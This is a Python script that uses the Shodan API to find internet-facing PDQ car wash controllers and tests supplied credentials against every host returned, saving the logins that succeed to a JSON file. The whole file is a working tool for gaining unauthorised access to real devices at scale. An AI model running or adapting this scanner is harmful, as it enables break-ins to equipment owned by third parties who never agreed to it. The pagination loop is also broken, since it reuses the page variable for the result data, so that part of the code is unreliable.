import shodan
import time
import json
import requests
import argparse
from requests.models import HTTPBasicAuth

# Your Shodan API key
SHODAN_API_KEY = '<YOUR API KEY>'
api = shodan.Shodan(SHODAN_API_KEY)

# Positional arguments to add, to test different credentials
parser = argparse.ArgumentParser(description='Search shodan for vulnerable PDQ carwashers')
parser.add_argument('-u', '--user', type=str, help='username to test pdq carwash for')
parser.add_argument('-p', '--passw', type=str, help='password to test pdq carwash for')
args = parser.parse_args()
user = args.user
passw = args.passw

# Requests a page of data from Shodan
def request_page_from_shodan(query, page=1):
    while True:
        try:
            instances = api.search(query, page=page)
            return instances
        except shodan.APIError as e:
            print(f"Error: {e}")
            time.sleep(5)


# Tests the given credential arguments
def has_valid_credentials(instance):
    try:
        res = requests.get(f"http://{user}:{passw}@{instance['ip_str']}:{instance['port']}")
        time.sleep(0.5)
        if res.status_code == 200:
            return True
        elif res.status_code != 200: # For God knows what reason first query always seems to be 401
            print(f'[-] Got HTTP status code {res.status_code}, expected 200') # If Error 401, invalid credentials
            return False
    except requests.exceptions.ConnectionError as e:
        print('[-] Error: {}'.format(e))

# Takes a page of results, and scans each of them, running has_valid_credentials and outputting to json
def process_page(page):
    result = []
    for instance in page['matches']:
        if has_valid_credentials(instance):
            print(f"[+] Valid credentials at : {instance['ip_str']}:{instance['port']}")
            data = "http://" + user + ":" + passw + "@" + instance['ip_str'] + ":" + str(instance['port'])
            result.append(data)
            with open('pdq_results.json', 'w') as file:
                json.dump(result, file, indent=2)
    return result

# Iterates through each page of results
def query_shodan(query):
    print("[*] Querying the first page")
    first_page = request_page_from_shodan(query)
    total = first_page['total']
    already_processed = len(first_page['matches'])
    result = process_page(first_page)
    page = 2
    while already_processed < total:
        print("querying page {page}")
        page = request_page_from_shodan(query, page=page)
        already_processed += len(page['matches'])
        result += process_page(page)
        page += 1
    return result

res = query_shodan('WWW-Authenticate: Basic Realm="PDQ"')
print(res)